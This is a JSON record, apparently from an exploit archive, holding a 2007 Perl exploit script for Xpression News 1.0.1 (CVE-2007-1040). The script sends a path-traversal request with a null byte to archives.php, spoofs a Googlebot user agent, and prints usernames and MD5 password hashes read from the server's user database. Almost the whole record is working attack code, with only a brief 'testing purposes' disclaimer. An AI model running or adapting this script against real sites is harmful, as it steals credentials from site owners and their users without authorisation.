{
  "id": "3332",
  "title": "Xpression News 1.0.1 - &#039;archives.php&#039; Remote File Disclosure",
  "cve": "CVE-2007-1040",
  "vuln_type": "unknown",
  "code": "#################################################################################################\r\n#                                    r0ut3r Presents...                                         #\r\n#                                                                                               #\r\n#                                Another r0ut3r discovery!                                      #\r\n#                                  writ3r [at] gmail.com                                        #\r\n#                                                                                               #\r\n#                          XNews Remote File Disclosure Exploit                                 #\r\n#################################################################################################\r\n# Software: Xnews 1.0.1                                                                         #\r\n#                                                                                               #\r\n# Vendor: http://xpression.hogsmeade-village.com/                                               #\r\n#                                                                                               #\r\n# Released: 2007/01/28                                                                          #\r\n#                                                                                               #\r\n# Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #\r\n#                                                                                               #\r\n# Note: The information provided in this document is for Xnews administrator                    #\r\n# testing purposes only!                                                                        #\r\n#                                                                                               #\r\n# Whats up Timq, tgo, str0ke, dr max virus                                                      #\r\n#################################################################################################\r\n\r\nuse IO::Socket;\r\n\r\n$port = \"80\"; # connection port\r\n$target = shift; # xpression.hogsmeade-village.com\r\n$folder = shift; # /demo/\r\n\r\nsub Header()\r\n{\r\n        print q\r\n        {Xpression News File Disclosure Exploit - writ3r [at] gmail.com\r\n--------------------------------------------------------------\r\n};\r\n}\r\n\r\nsub Usage()\r\n{\r\n        print q\r\n        {Usage: xnewsxpl.pl [target] [directory]\r\nExample: xnewsxpl.pl xpression.hogsmeade-village.com /demo/\r\n};\r\n        exit();\r\n}\r\n\r\nHeader();\r\n\r\nif (!$target || !$folder) {\r\n        Usage(); }\r\n\r\n$res = false;\r\nprint \"[+] Connecting...\\r\\n\";\r\n$xpack = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target, PeerPort => $port) || die \"[-] Failed to connect on exploit attempt. Exiting...\\r\\n\";\r\nprint $xpack \"GET \".$folder.\"archives.php?xnews-template=../userdb.php%00 HTTP/1.1\\n\";\r\nprint $xpack \"Host: $target\\n\";\r\nprint $xpack \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\n\";\r\nprint $xpack \"Accept: text/html\\n\";\r\nprint $xpack \"Connection: keep-alive\\n\\n\\r\\n\";\r\n\r\nwhile (<$xpack>)\r\n{\r\n        if (/(.*?)\\|(.*?)\\|(.*?)\\|/) {\r\n                print \"Username: $1\\n\";\r\n                print \"MD5 Hash: $3\\n\";\r\n                $res = true;\r\n        exit; }\r\n\r\n}\r\nif ($res eq false) {\r\n        print \"[-] Exploit failed - Not vulnerable\\n\"; }\r\n\r\nprint \"[!] Connection to host lost...\\n\";\r\n\r\n# milw0rm.com [2007-02-18]",
  "url": "https://www.exploit-db.com/exploits/3332"
}